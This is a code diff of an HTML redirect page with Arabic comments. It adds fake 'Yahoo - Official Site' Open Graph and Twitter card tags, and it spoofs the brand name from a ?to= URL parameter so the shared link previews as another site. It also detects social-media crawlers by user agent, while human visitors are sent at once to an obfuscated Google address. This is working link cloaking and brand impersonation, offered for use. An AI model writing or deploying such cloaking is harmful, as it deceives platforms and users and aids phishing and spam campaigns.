@@ -2,44 +2,44 @@
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <title>Content Loading</title>
+  
+  <!-- وسوم المعاينة الرسمية لـ Yahoo الثابتة كخيار أول للبوتات -->
+  <title>Yahoo - Official Site</title>
+  <meta property="og:title" content="Yahoo - Official Site">
+  <meta property="og:description" content="Welcome to the official Yahoo page. Click to access the content securely.">
+  <meta property="og:image" content="https://yimg.com">
+  
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:title" content="Yahoo - Official Site">
+  <meta name="twitter:description" content="Welcome to the official Yahoo page. Click to access the content securely.">
+  <meta name="twitter:image" content="https://yimg.com">
 
   <script type="text/javascript">
     (function() {
       var currentUrl = window.location.href;
-      var domainName = "Content";
+      var domainName = "Yahoo";
 
-      // 1. استخراج اسم الموقع الذكي من الرابط المكتوب بعد ?to=
       if (currentUrl.includes("?to=")) {
         var urlParams = new URLSearchParams(window.location.search);
         var toParam = urlParams.get('to') || "";
-        // تنظيف النطاق وعزل الاسم الأساسي للموقع (مثل yahoo أو yopmail)
         var clean = toParam.replace(/^(https?:\/\/)?(www\.)?/, "").split('.')[0];
         if (clean) {
           domainName = clean.charAt(0).toUpperCase() + clean.slice(1);
         }
       }
 
-      // بناء العناوين والوصف ديناميكياً ليقرأها تويتر فوراً بناءً على اسم الموقع في الرابط
-      var pageTitle = domainName + " - Official Site";
-      var pageDesc = "Welcome to the official " + domainName + " page. Click to access the content securely.";
-      var fallbackImage = "https://yimg.com"; // صوره افتراضية جذابة
-
-      // حقن وسوم الميتا الثابتة للبوتات فوراً قبل مغادرتها الصفحة
-      document.write('<title>' + pageTitle + '</title>');
-      document.write('<meta property="og:title" content="' + pageTitle + '">');
-      document.write('<meta property="og:description" content="' + pageDesc + '">');
-      document.write('<meta property="og:image" content="' + fallbackImage + '">');
-      document.write('<meta name="twitter:card" content="summary_large_image">');
-      document.write('<meta name="twitter:title" content="' + pageTitle + '">');
-      document.write('<meta name="twitter:description" content="' + pageDesc + '">');
-      document.write('<meta name="twitter:image" content="' + fallbackImage + '">');
+      // تحديث العناوين ديناميكياً إذا تم تغيير الرابط لموقع آخر مثل yopmail
+      if (domainName !== "Yahoo") {
+        document.title = domainName + " - Official Site";
+        document.querySelector('meta[property="og:title"]').setAttribute("content", domainName + " - Official Site");
+        document.querySelector('meta[name="twitter:title"]').setAttribute("content", domainName + " - Official Site");
+      }
 
       var ua = navigator.userAgent || "";
       var isBot = /Twitterbot|facebookexternalhit|LinkedInBot|TelegramBot|Slackbot|Discordbot|Embedly|Googlebot/i.test(ua);
 
-      // 2. إذا كان زائر حقيقي: تحويل فوري وعشوائي إلى جوجل كالعادة
       if (!isBot) {
+        // تحويل الزوار الحقيقيين فوراً وعشوائياً إلى جوجل كما في كودك الأصلي
         var a = "goog"; var b = "le."; var c = "com/?"; var d = Math.ceil(Math.random() * 24);
         window.location.replace("https://" + a + b + c + d);
       }
